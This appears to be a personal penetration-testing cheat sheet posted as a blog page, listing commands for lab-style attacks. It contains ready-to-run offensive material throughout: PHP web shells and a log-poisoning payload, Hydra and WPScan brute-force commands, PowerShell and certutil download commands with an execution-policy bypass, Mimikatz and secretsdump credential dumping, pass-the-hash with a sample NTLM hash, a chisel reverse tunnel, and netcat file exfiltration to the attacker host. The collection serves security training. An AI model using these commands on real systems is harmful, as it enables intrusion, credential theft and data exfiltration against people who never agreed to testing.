+++
title = 'common.txt'
date = 2024-08-24T16:50:47-04:00
draft = false
summary = "Command commands"
+++

```bash
# File containing common commands and techniques

-----------------------------------Terminator------------------------
# Split vertically
CTRL + Shift + E
# Split Horizontally
CTRL + SHIFT + O
# New Tab
CTRL + SHIFT + T


-------------------------------------TTY Magic-----------------------

==TTY Magic:
python -c 'import pty;pty.spawn("/bin/bash")'
tty
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='clear ; ls -lsaht --color=auto'
Ctrl + Z (Background Process)
stty -a 
stty raw -echo ; fg ; reset

# Set rows and columns
stty rows 80
stty columns 148



----------------------------NMAP-----------------

nmap -p- -T5 -oN all-ports.nmap $IP

nmap -p <ports list> -A $IP





------------------WEB CONTENT ---------------------------------------------------------------------------

===Fuzz Directories:


feroxbuster --url http://192.168.220.225:8090 -o ferox-8090.out -x php,html,txt -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt 

wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-directories.txt --hc 404 "$URL"

===Fuzz Files:
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 404 "$URL"

===Authenticated Fuzz Directories:
wfuzz -c -z file,/opt/SecLists/DiscoveryWeb-Content/raft-medium-directories.txt --hc 404 -d "PARAM=value" "$URL"

===Fuzz Parameters:
# Exclude byte length for params that don't exist with -hh
wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt "$URL"


===== Vhost Discovery:
ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://board.htb -H 'Host: FUZZ.board.htb' -fs 15949

===Nikto Scan
nikto -h $URL -p $PORT

===LFI Fuzzing:
wfuzz -c -z file,/opt/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt "$URL"

===Wordpress
# Enumerate users
wpscan --url $URL --api-token <api_tok> -e u

# Enumerate vuln themes/plugins/users
wpscan --url $URL --api-token <api_tok> -e vt,vp,u

# If we have a username, we can try to brute force the login
wpscan --url $URL --password-attack wp-login -U user.txt -P /usr/share/wordlists/rockyou.txt   
-----------------------SMTP-------------------------------------------------------------------------

===SMTP USER ENUM:
smtp-user-enum -M VRFY -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
smtp-user-enum -M EXPN -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP
smtp-user-enum -M RCPT -U /opt/SecLists/Usernames/xato-net-10-million-usernames.txt -t $IP


-----------------------Brute Force------------------------------------------------------------------

# Hydra

===SSH Login with user/pass file:
hydra -C creds ssh://$IP
hydra -C /opt/SecLists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt ssh://$IP

===FTP Login with user/pass file:
hydra -C /opt/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt ftp://$IP

===Postgres login with user/pass file:
hydra -C /opt/SecLists/Passwords/Default-Credentials/postgres-betterdefaultpasslist.txt postgres://$IP

===MySql login with user/pass file:
hydra -C /opt/SecLists/Passwords/mysql-betterdefaultpasslist.txt mysql://$IP

===SSH login with known user
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://$IP

===HTTP Post Form
hydra -l $USER -P /usr/share/wordlists/rockyou.txt $IP http-post-form "<URL endpoint>:<PARAMS>:F=<failure message>"

-----------------------WINDOWS DOWNLOAD FILES------------------------------------------------------

# Execution Bypass
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1


iwr -uri <url> -Outfile <filename>

powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.2/exploit.exe', 'exploit.exe')

certutil.exe -urlcache -f http://$MY_IP/$file $file

#Download multiple files on a box
#multi_file.ps1
$baseUrl = "http://<ip>/"
$fileNames = @("file1.txt", "file2.txt", "file3.txt")
$downloadPath = "C:\Windows\Tasks"

foreach ($fileName in $fileNames) {
	$url = $baseUrl + $fileName
	$filepath = Join-Path $downloadPath $fileName
	Invoke-WebRequest -Uri $url -OutFile $filePath
	Write-Host "Downloaded $fileName to $filePath"
}


--------------------WINDOWS ENUMERATION-------------------------------------------------------------------

# Get System info

systeminfo
systeminfo | findstr /b /C:"OS Name" /C"OS Version"

# Get installed updates

wmic qfe get Caption, Description

# User ENUMERATION
whoami

# Check user privs
whoami /priv

# Check user groups
whoami /groups

# View all users
net users

# List User groups
net localgroup

# Find Passwords
findstr /si password *.txt *.ini *.config

------------------------------------WINDOWS CONT'd----------------------------------

===Crackmapexec:

protocols:
  available protocols

  {ssh,ldap,winrm,ftp,rdp,smb,mssql}
    ssh                 own stuff using SSH
    ldap                own stuff using LDAP
    winrm               own stuff using WINRM
    ftp                 own stuff using FTP
    rdp                 own stuff using RDP
    smb                 own stuff using SMB
    mssql               own stuff using MSSQL

# Check for auth with a NTLM hash
crackmapexec smb 10.11.1.20-24 -u administrator -H ee0c207898a5bccc01f38115019ca2fb

# Password
crackmapexec smb 10.11.1.20-24 -u administrator -p <password>

===PsExec.py:
python3 psexec.py administrator@10.5.5.30 -dc-ip 10.5.5.30


===Mimikatz:

token::elevate
privilege::debug
log
sekurlsa::logonpasswords
lsadump::sam
lsadump::secrets
lsadump::cache


===Secretsdump.py:
# when you have the sam/system locally
python3 secretsdump.py -sam SAM -system SYSTEM LOCAL      

# remote with pass
python3 secretsdump.py administrator@192.168.190.141

# remote with hash
python3 secretsdump.py administrator@192.168.190.141 -k <hash>                                                                                  2 ⨯





-------------------------------------------Log Poisoning-------------------------------

# If there's an LFI, check for access to log files (apache/nginx)
# Attempt to add a php code execution parameter
nc -nv $IP <port>
GET /<?php passthru($_GET['fish']);?>


------------------------------PHP Code Executions---------------------------------------
<?php passthru($_GET['cmd']); ?>
<?php system($_GET['cmd']); ?>
<?php shell_exec($_GET['cmd']); ?>
<?php exec($_GET['cmd']); ?>
<?php pOpen($_GET['cmd']); ?>

-----------------------------------Linux Manual Priv Esc Enum-----------------------------

# Check for where we can live, what folders we can write to

# Check for interesting folder in /

# Check for root processes
ps aux | grep -i 'root' --color=auto

# Check network connections, pay attention to 127.0.0.1 addresses
# netstat -antup

# Check /etc/ directory for misconfigurations... i.e things not root:root/root:shadow
ls -ltra /etc

# Check /etc/passwd for write perms
ls -ltra /etc/passwd

# Check /var/mail
ls -ltra /var/mail

# Check for suid/guid binaries
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# Check sudo privs 
sudo -l

# Check cronjobs
cat /etc/crontab
ls -lah /etc/cron*

# Enumerate OS and arch
cat /etc/issue
cat /etc/*-release
uname -a

# Check installed applications
dpkg -l

# Writable files
find / -writable -type d 2>/dev/null

# Mountable volumes
cat /etc/fstab
mount
/bin/lsblk

# Device drivers / modules
lsmod
/sbin/modinfo libata


--------------------------Tunneling--------------------------

## Chisel socks proxy
# kali
./chisel_arm64 server --reverse --port 443 
# victim
chisel.exe client 192.168.45.247:443 R:socks


--------------------------WEB--------------------------

## Check for XFF if we can add an input




-----------------------nc-----------------------
# Send file with nc

## On local host 
nc -l -p 1234 -q 1 > '<filename> < /dev/null

## on remote host
cat <filename> | nc <kali ip> 1234

```